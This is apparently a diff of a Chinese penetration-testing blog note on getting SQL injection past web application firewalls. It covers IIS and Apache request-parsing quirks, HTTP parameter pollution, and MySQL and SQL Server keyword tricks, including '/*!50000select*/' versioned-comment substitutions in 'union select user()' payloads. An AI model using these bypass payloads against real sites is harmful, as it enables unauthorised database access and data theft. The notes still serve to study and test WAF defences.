@@ -7,53 +7,45 @@ tags: 渗透测试
 ---
 
 
-## 前言
+## 1 SQL注入过程中的处理
 
 	终端payload编码 ---------> web服务器解码 ---------> CGI脚本解码 ---------> web应用解码 ---------> 数据库解码
      浏览器、代理等         IIS/Apache/Tomcat        php/java/asp.net           xxx系统           mysql/slqserver
      				  硬件WAF				 软件WAF
 
-### 服务器层面
+---
 
-URL编解码：
+## 2 bypass方法
 
-浏览器：
+### 2.1 服务器层面bypass
 
-
-HTTP POST编解码：
-
-apache：
-
-URL编解码
+#### 2.1.1 IIS+ASP、URL处理
 
 
-IIS+ASP、URL处理
+%符号的处理：会自动去掉特殊符号%，例如输入se%lect，解析出select
 
-特殊符号%，会自动去掉%，例如输入se%lect，解析出select
+unicode处理：%u，会自动解码，例如s%u006c%u0006ect
 
-unicode处理，%u，会自动解码，例如s%u006c%u0006ect
+#### 2.1.2 Apache
 
-Apache：
 
 有的版本允许畸形请求存在，例如GET可替换为任意word，例如"DOTA"
 
+#### 2.1.3 HPP方式
+
+    id=1&id=2&id=3
+
+    Asp.net + iis：id=1,2,3
+    Asp + iis：id=1,2,3
+    Php + apache：id=3
 
 
-HPP方式：
-
-	id=1&id=2&id=3 
-
-	Asp.net + iis：id=1,2,3 
-	Asp + iis：id=1,2,3 
-	Php + apache：id=3
-
-
-### 数据库层面
+### 2.2 数据库层面bypass
 
 	1 union select a, b from  where and 
 	 1  2  3  4   5    6    7      8   9
 
-#### mysql数据库
+#### 2.2.1 mysql数据库
 
 ##### 位置1的替换：
 
@@ -189,9 +181,17 @@ HPP方式：
 	Hex(‘a’)
 	Unhex(61)
 
+4、/\*!50000keyword\*/替换
+
+    任何关键字都可以用/*!50000keyword*/替换，例如：
+    select name from user where id=1 union select user();
+    select name from user where id=1 union/*!50000select*/user();
+    select name from user where id=1 /*!50000union*/select user();
+    select name from user where id=1 union select/*!50000user()*/;
+
 ---
 
-#### sqlserver数据库
+#### 2.2.2 sqlserver数据库
 
 ##### 空格符的替换
 
@@ -238,11 +238,11 @@ HPP方式：
 	Ascii(‘a’) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
 	Char(‘97’)
 
+---
 
-http://drops.wooyun.org/tips/7883
+## 3 参考
 
-http://drops.wooyun.org/tips/968
-
-https://www.exploit-db.com/papers/17934/
-
-http://drops.wooyun.org/tips/123
+* http://drops.wooyun.org/tips/7883
+* http://drops.wooyun.org/tips/968
+* https://www.exploit-db.com/papers/17934/
+* http://drops.wooyun.org/tips/123
